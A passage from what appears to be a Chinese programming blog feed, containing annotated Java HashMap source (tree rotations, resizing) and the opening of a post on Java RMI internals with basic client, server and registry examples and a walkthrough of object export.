右旋</span></span><br><span class="line">                            root = rotateRight(root, x = xp);</span><br><span class="line">                            xpp = (xp = x.parent) == <span class="literal">null</span> ? <span class="literal">null</span> : xp.parent;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 左旋  因为存在连个连续的红色 先进行变色</span></span><br><span class="line">                        <span class="keyword">if</span> (xp != <span class="literal">null</span>) &#123;</span><br><span class="line">                            xp.red = <span class="literal">false</span>; <span class="comment">// 父节点变黑</span></span><br><span class="line">                            <span class="keyword">if</span> (xpp != <span class="literal">null</span>) &#123;</span><br><span class="line">                                xpp.red = <span class="literal">true</span>; <span class="comment">// 祖父节点变红</span></span><br><span class="line">                                root = rotateLeft(root, xpp);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="左旋"><a href="#左旋" class="headerlink" title="左旋"></a>左旋</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; TreeNode&lt;K,V&gt; <span class="title function_">rotateLeft</span><span class="params">(TreeNode&lt;K,V&gt; root,</span></span><br><span class="line"><span class="params">                                              TreeNode&lt;K,V&gt; p)</span> &#123;</span><br><span class="line">            TreeNode&lt;K,V&gt; r, pp, rl;</span><br><span class="line">            <span class="comment">// 以当前节点的父节点为轴进行旋转 即p</span></span><br><span class="line">            <span class="comment">// 将p的右节点取出来 赋值给r</span></span><br><span class="line">            <span class="keyword">if</span> (p != <span class="literal">null</span> &amp;&amp; (r = p.right) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 将r的左节点赋值给p的右节点  p是肯定小于r的子节点的  所以是将r的子节点赋值给p的右节点</span></span><br><span class="line">                <span class="keyword">if</span> ((rl = p.right = r.left) != <span class="literal">null</span>)</span><br><span class="line">                    <span class="comment">// r的左节点指向新的父节点 p</span></span><br><span class="line">                    rl.parent = p;</span><br><span class="line">                <span class="comment">// 因为r的位置会被提升 此时p变成r的子节点所以 p的父节点变成r的父节点</span></span><br><span class="line">                <span class="keyword">if</span> ((pp = r.parent = p.parent) == <span class="literal">null</span>)</span><br><span class="line">                    <span class="comment">// 如果p没有父节点 p本身就是根节点了  p必须为黑色</span></span><br><span class="line">                    (root = r).red = <span class="literal">false</span>;</span><br><span class="line">                <span class="comment">// 如果p有父节点  且p是其父节点的坐子叶</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (pp.left == p)</span><br><span class="line">                    <span class="comment">// 直接设置 pp的左子叶为r</span></span><br><span class="line">                    pp.left = r;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="comment">// 如果是右子叶  则设置r为右子叶</span></span><br><span class="line">                    pp.right = r;</span><br><span class="line">                <span class="comment">// 左旋嘛  设置p为r的左子叶</span></span><br><span class="line">                r.left = p;</span><br><span class="line">                <span class="comment">// p的父节点为r</span></span><br><span class="line">                p.parent = r;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 完成</span></span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h3 id="右旋"><a href="#右旋" class="headerlink" title="右旋"></a>右旋</h3><p>右旋和左旋差不多</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &lt;K,V&gt; TreeNode&lt;K,V&gt; <span class="title function_">rotateRight</span><span class="params">(TreeNode&lt;K,V&gt; root,</span></span><br><span class="line"><span class="params">                                               TreeNode&lt;K,V&gt; p)</span> &#123;</span><br><span class="line">            TreeNode&lt;K,V&gt; l, pp, lr;</span><br><span class="line">            <span class="keyword">if</span> (p != <span class="literal">null</span> &amp;&amp; (l = p.left) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((lr = p.left = l.right) != <span class="literal">null</span>)</span><br><span class="line">                    lr.parent = p;</span><br><span class="line">                <span class="keyword">if</span> ((pp = l.parent = p.parent) == <span class="literal">null</span>)</span><br><span class="line">                    (root = l).red = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (pp.right == p)</span><br><span class="line">                    pp.right = l;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    pp.left = l;</span><br><span class="line">                l.right = p;</span><br><span class="line">                p.parent = l;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h1 id="扩容"><a href="#扩容" class="headerlink" title="扩容"></a>扩容</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt;[] resize() &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] oldTab = table;</span><br><span class="line">        <span class="comment">// 原表为空  new完后就是空的 </span></span><br><span class="line">        <span class="type">int</span> <span class="variable">oldCap</span> <span class="operator">=</span> (oldTab == <span class="literal">null</span>) ? <span class="number">0</span> : oldTab.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">oldThr</span> <span class="operator">=</span> threshold;</span><br><span class="line">        <span class="comment">// 新表容量以及扩容阈值</span></span><br><span class="line">        <span class="type">int</span> newCap, newThr = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 原表长度大于0</span></span><br><span class="line">        <span class="keyword">if</span> (oldCap &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 原表已经是最大值了  不扩容  直接返回</span></span><br><span class="line">            <span class="keyword">if</span> (oldCap &gt;= MAXIMUM_CAPACITY) &#123;</span><br><span class="line">                threshold = Integer.MAX_VALUE;</span><br><span class="line">                <span class="keyword">return</span> oldTab;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 原表容量扩大一倍 如果小于最大容量且原表容量大于等于默认容量</span></span><br><span class="line">            <span class="comment">// 新表阈值同比扩大一倍</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ((newCap = oldCap &lt;&lt; <span class="number">1</span>) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class="line">                     oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class="line">                newThr = oldThr &lt;&lt; <span class="number">1</span>; <span class="comment">// double threshold</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果原表容量小于等于0 且原表的阈值大于0</span></span><br><span class="line">        <span class="comment">// 新的容量为原表的阈值</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (oldThr &gt; <span class="number">0</span>) <span class="comment">// initial capacity was placed in threshold</span></span><br><span class="line">            newCap = oldThr;</span><br><span class="line">        <span class="comment">// 原表的容量等于0</span></span><br><span class="line">        <span class="keyword">else</span> &#123;               <span class="comment">// zero initial threshold signifies using defaults</span></span><br><span class="line">            newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class="line">            newThr = (<span class="type">int</span>)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 新表阈值等于零 通过公式计算新的阈值</span></span><br><span class="line">        <span class="keyword">if</span> (newThr == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)newCap * loadFactor;</span><br><span class="line">            newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (<span class="type">float</span>)MAXIMUM_CAPACITY ?</span><br><span class="line">                      (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">        &#125;</span><br><span class="line">        threshold = newThr;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[newCap];</span><br><span class="line">        table = newTab;</span><br><span class="line">        <span class="keyword">if</span> (oldTab != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 遍历原表</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; oldCap; ++j) &#123;</span><br><span class="line">                Node&lt;K,V&gt; e;</span><br><span class="line">                <span class="keyword">if</span> ((e = oldTab[j]) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    oldTab[j] = <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// 如果原表的某一个位置只有一个节点 则直接将这个节点重新计算索引放到新表中</span></span><br><span class="line">                    <span class="keyword">if</span> (e.next == <span class="literal">null</span>)</span><br><span class="line">                        newTab[e.hash &amp; (newCap - <span class="number">1</span>)] = e;</span><br><span class="line">                    <span class="comment">// 如果是红黑树 则进行单独处理</span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                        ((TreeNode&lt;K,V&gt;)e).split(<span class="built_in">this</span>, newTab, j, oldCap);</span><br><span class="line">                    <span class="keyword">else</span> &#123; <span class="comment">// preserve order</span></span><br><span class="line">                        Node&lt;K,V&gt; loHead = <span class="literal">null</span>, loTail = <span class="literal">null</span>;</span><br><span class="line">                        Node&lt;K,V&gt; hiHead = <span class="literal">null</span>, hiTail = <span class="literal">null</span>;</span><br><span class="line">                        Node&lt;K,V&gt; next;</span><br><span class="line">                        <span class="keyword">do</span> &#123;</span><br><span class="line">                            next = e.next;</span><br><span class="line">                            <span class="comment">// 区分hash位于新表的高位还是低位</span></span><br><span class="line">                            <span class="comment">// 因为 新表的容量总是原表的2次幂，所以原表某一索引位置的链表中的节点再新表中</span></span><br><span class="line">                            <span class="comment">// 要么位于 原来的位置  要么位于原来的位置加原表的容量 得到的新的位置</span></span><br><span class="line">                            <span class="comment">// 这些结果位于原表同一索引位置</span></span><br><span class="line">                            <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (loTail == <span class="literal">null</span>)</span><br><span class="line">                                    loHead = e;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    loTail.next = e;</span><br><span class="line">                                loTail = e;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// 位于原表索引+原表容量的位置</span></span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (hiTail == <span class="literal">null</span>)</span><br><span class="line">                                    hiHead = e;</span><br><span class="line">                                <span class="keyword">else</span></span><br><span class="line">                                    hiTail.next = e;</span><br><span class="line">                                hiTail = e;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">while</span> ((e = next) != <span class="literal">null</span>);</span><br><span class="line">                        <span class="keyword">if</span> (loTail != <span class="literal">null</span>) &#123;</span><br><span class="line">                            loTail.next = <span class="literal">null</span>;</span><br><span class="line">                            newTab[j] = loHead;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (hiTail != <span class="literal">null</span>) &#123;</span><br><span class="line">                            hiTail.next = <span class="literal">null</span>;</span><br><span class="line">                            newTab[j + oldCap] = hiHead;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newTab;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h1 id="Node与TreeNode"><a href="#Node与TreeNode" class="headerlink" title="Node与TreeNode"></a>Node与TreeNode</h1><p>Node对象表示一个链表节点，其包含4个关键成员变量分别为 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> hash; <span class="comment">// key的hash值</span></span><br><span class="line"><span class="keyword">final</span> K key; <span class="comment">// key</span></span><br><span class="line">V value; <span class="comment">// value</span></span><br><span class="line">Node&lt;K,V&gt; next; <span class="comment">// 下一个节点</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>HashMap</tag>
      </tags>
  </entry>
  <entry>
    <title>从头开始挖掘Java RMI漏洞</title>
    <url>/archives/b83d1f32.html</url>
    <content><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>关于Java RMI 的内容反反复复也是看了很多到了，它在我的日常工作中更多的是作为一个知识点而存在，时不时就得拿出来温习一下，时间久了就会被遗忘掉具体的细节。<br>但这个概念也算是Java漏洞利用中的一个明星概念以及有一定复杂度与难度的知识点了，也是面试中的常客（虽然已经很久没有参加面试了，不过我想应该是这样的，毕竟Java安全的东西说破天也就那么多）  </p>
<h1 id="RMI介绍"><a href="#RMI介绍" class="headerlink" title="RMI介绍"></a>RMI介绍</h1><p>RMI 顾名思义即远程方法调用，用户通过一些指定查找远程服务器上的对象方法并实施调用，概念是很清楚的，但其实现的机制却不简单。<br>在Java的RMI实现中涉及到三方成员，即调用客户端，远程注册中心以及远程服务提供者。调用客户端很容易理解即RMI调用的发起者，远程服务提供者也不难理解即提供RMI服务的主体，<br>远程注册中心想必也并不复杂即远程服务提供者将其能够提供的服务注册到注册中心的注册表中供调用客户端进行查询。我们换个更加通俗一点的说法可能更易理解。<br>假如我是一个中间商，我提供的服务是联系消费者与供应商，我这里有一张表，这张表上记录了每个供应商拥有的商品的类型以及价格等信息，这些信息是我的核心商业秘密，一般消费者是无法获取到这些信息的。<br>你是一个小市民，当牛做马10多年终于凑够的房子的首付想要购入一套新房但是你不知道要向谁购买，你机缘巧合下找到了我这个中间商，我告诉你我这里有很多房地产商的联系方式，你只需要付给我10%房价的佣金（黑心）<br>我就把他们的联系方式告诉你，你虽然万般不愿但也没有更好的办法只能接受我的剥削，我们的交易最终达成，你拿着从我这里买来的联系方式找到房地产开发商购买商品房。<br>最终我们实现了三赢，你买到了房子，我赚了佣金，房地产开发商得到了现金流。<br>在这个例子中，你就是远程调用者，我就是注册中心，房地产开发商就是服务提供者，我们的关系也就是RMI中三个关键概念的关系。  </p>
<h1 id="RMI调用实例"><a href="#RMI调用实例" class="headerlink" title="RMI调用实例"></a>RMI调用实例</h1><p>首先创建一个远程对象，其需要继承<code>UnicastRemoteObject</code>类并实现一个<code>Remote</code>类的子接口。<br>继承<code>UnicastRemoteObject</code>类是为了在创建该远程对象实例的时候能够调用到继承<code>UnicastRemoteObject</code>的构造方法从而完成远程对象服务器的监听以及对象的导出，当然这都是后话，后面会进行详细介绍。<br>实现<code>Remote</code>子接口是因为该接口起到一个标志作用，表明该实现类是可以被远程调用的。<br>而远程对象类为什么实现的是<code>Remote</code>的子类而不是直接实现<code>Remote</code>接口则是因为调用客户端在获得远程对象引用的存根对象时得到的是一个动态代理对象，该对象会被客户端映射为远程的对象直接调用其对应的方法，<br>而<code>Remote</code>类默认是不存在这些方法的，所以我们需要一个接口先将这些方法进行生命以便调用客户端能够对获得的远程对象存根进行强制类型转换，这一点我们在客户端的创建代码中可以看到。    </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BindObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">CustomRemote</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">BindObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>创建<code>Remote</code>接口的子接口<code>CustomRemote</code><br>该接口定义了方法<code>sayHello</code>，该方法也就是可以被客户端调用的方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CustomRemote</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>创建注册中心  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="comment">// 创建远程对象</span></span><br><span class="line">        <span class="type">BindObject</span> <span class="variable">bindObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BindObject</span>();</span><br><span class="line">        <span class="comment">// 创建注册中心</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 绑定远程对象</span></span><br><span class="line">        registry.bind(<span class="string">&quot;test&quot;</span>, bindObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建调用客户端  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="comment">// 获取到注册中心的存根</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 通过注册中心存根据远程对象名称查询远程对象获取到远程对象的引用</span></span><br><span class="line">        <span class="comment">// 获取到的是一个动态代理对象  每一个方法的调用都要通过invocationHandler的invoke方法 这很重要</span></span><br><span class="line">        <span class="type">CustomRemote</span> <span class="variable">test</span> <span class="operator">=</span> (CustomRemote) registry.lookup(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用远程对象方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> test.sayHello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="远程服务提供者是如何启动的"><a href="#远程服务提供者是如何启动的" class="headerlink" title="远程服务提供者是如何启动的"></a>远程服务提供者是如何启动的</h1><p>我们在 <a href="#id_1">RMI调用实例</a> 中提到过远程服务提供者需要继承<code>UnicastRemoteObject</code>类，其目的是为了能够调用该类的构造方法从而完成远程对象服务器的监听以及对象导出，我们分析的起点也就是该类的构造方法。<br>此处调用了<code>UnicastRemoteObject</code>的有参构造方法并传入了一个参数<code>0</code>，该参数表示监听的端口，<code>0</code>即由系统自动分配一个端口。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>接下来调用了<code>exportObject</code>方法，顾名思义这是一个与远程对象导出有关的方法，其接收两个参数，第一个参数传入我们实例化的远程对象本身，第二个参数为端口。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">        exportObject((Remote) <span class="built_in">this</span>, port);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>exportObject</code>方法继续调用了其重载方法，该重载方法接受两个参数，第一个参数由外层方法进行原样传递，第二个参数被封装到<code>UnicastServerRef</code>对象中。<br><code>UnicastServerRef</code>的实例对象是对远程对象服务器的启动极为重要的一个类，包括对象导出的具体逻辑、接受消息的消息分发都与该类有关。<br>此处在进行实例化的时候主要作用是将<code>port</code>参数封装到<code>LiveRef</code>实例对象中，并将该LiveRef实例赋值给<code>UnicastServerRef</code>的<code>ref</code>成员变量。<br>在<code>LiveRef</code>对象中则主要是通过<code>port</code>参数创建了服务器监听的<code>Endpoint</code>对象并实例化了一个<code>ObjID</code>用于唯一标识正在创建的远程对象。<br>具体的代码就不放了，就是一些new以及赋值操作。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在重载的<code>exportObject</code>方法中，首先会对输入的远程对象进行类型判断，如果其继承了<code>UnicastRemoteObject</code>类则将刚才创建的单播服务引用<code>UnicastServerRef</code><br>设置到该对象的<code>ref</code>成员变量中。 然后会调用<code>UnicastServerRef</code>的<code>exportObject</code>方法。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">            ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在<code>UnicastServerRef</code>的<code>exportObject</code>方法中，会获取到正在创建的远程对象的<code>Class</code>对象，然后调用<code>Util.createProxy</code>方法创建一个当前正在创建的远程对象的动态代理对象。<br>然后判断该代理对象是否是<code>RemoteStub</code>的子类，如果是则会为当前正在创建的远程对象创建一个存根。接着将获取到的代理对象封装到<code>Target</code>对象中，并继续执行导出动作。<br>在进入到后面到导出操作前，这里我们需要重点关注动态代理对象的创建、存根对象的创建、Target对象的创建以及在导出后的方法hash计算的过程。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote var1, Object var2, <span class="type">boolean</span> var3)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var4</span> <span class="operator">=</span> var1.getClass();</span><br><span class="line"></span><br><span class="line">        Remote var5;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var5 = Util.createProxy(var4, <span class="built_in">this</span>.getClientRef(), <span class="built_in">this</span>.forceStubUse);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;remote object implements illegal remote interface&quot;</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var5 <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">            <span class="built_in">this</span>.setSkeleton(var1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Target</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Target</span>(var1, <span class="built_in">this</span>, var5, <span class="built_in">this</span>.ref.getObjID(), var3);</span><br><span class="line">        <span class="built_in">this</span>.ref.exportObject(var6);</span><br><span class="line">        <span class="built_in">this</span>.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);</span><br><span class="line">        <span class="keyword">return</span> var5;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>首先我们关注动态代理对象的创建过程，这里会调用<code>Util.createProxy</code>方法，该方接受三个参数，第一个参数为当前正在创建的远程对象的<code>Class</code>对象，第二个参数由<code>getClientRef</code>方法获取，<br>该方法将当前<code>UnicastServerRef</code>的<code>ref</code>成员变量封装到一个<code>UnicastRef</code>对象中，从名字中可以看出如果<code>UnicastServerRef</code>表示服务端的引用那么<code>UnicastRef</code>则表示客户端的引用，<br>第三个参数表示是否强制使用存根，默认为<code>false</code>。<br>进入到<code>createProxy</code>方法中，该方法首先调用<code>getRemoteClass</code>方法获取传入参数的所有父类中直接实现了<code>Remote</code>的子接口的类，这也是为什么我们前面不直接实现<code>Remote</code>接口而是先创建其子接口再实现的原因。<br>在调用<code>getRemoteClass</code>方法时我们传入的是<code>BindObject</code>的<code>Class</code>对象，因为<code>BindObject</code>实现了<code>Remote</code>的子接口，所以这里会直接返回<code>BindObject</code>的<code>Class</code>对象。<br>紧接着会遇到一个判断结构，这里重点关注<code>stubClassExists</code>方法的运行结构，因为<code>ignoreStubClasses</code>默认为<code>false</code>，根据运算符的优先级<code>and</code>会优先于<code>or</code>执行，所以这里的判断结果取决于<code>stubClassExists</code>的运算结果。<br><code>stubClassExists</code>方法会判断传入的<code>var3</code>的类名拼接<code>_Stub</code>作为新的类名的类是否存在，若存在则返回<code>true</code>，若不存在则返回<code>false</code>。<br>此处我们传入的是自定义的类，很明显其存根类是不存在的，所以这里会返回<code>false</code>，代码也会进入到<code>else</code>的逻辑中。那么当<code>var3</code>为什么时会进入到<code>if</code>紧跟着的代码块中呢。<br>当<code>var3</code>表示<code>RegistryImpl</code>的<code>Class</code>对象时会出现这样的情况，这将发生在注册中心的创建过程中，我们后面会介绍到的。<br>在<code>else</code>紧跟着的代码块中，我们创建了<code>UnicastRef</code>对象的动态代理对象，使用的<code>invocationHandler</code>为 <code>RemoteObjectInvocationHandler</code>，这一点是极为重要的，<br>因为在动态代理对象执行过程中<code>invocationHandler</code>的<code>invoke</code>方法会影响原本对象方法执行的行为，请记住这一点。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; var0, RemoteRef var1, <span class="type">boolean</span> var2)</span> <span class="keyword">throws</span> StubNotFoundException &#123;</span><br><span class="line">        Class var3;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var3 = getRemoteClass(var0);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;object does not implement a remote interface: &quot;</span> + var0.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var2 || !ignoreStubClasses &amp;&amp; stubClassExists(var3)) &#123;</span><br><span class="line">            <span class="keyword">return</span> createStub(var3, var1);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ClassLoader</span> <span class="variable">var4</span> <span class="operator">=</span> var0.getClassLoader();</span><br><span class="line">            <span class="keyword">final</span> Class[] var5 = getRemoteInterfaces(var0);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(var1);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> (Remote)AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">                    <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> 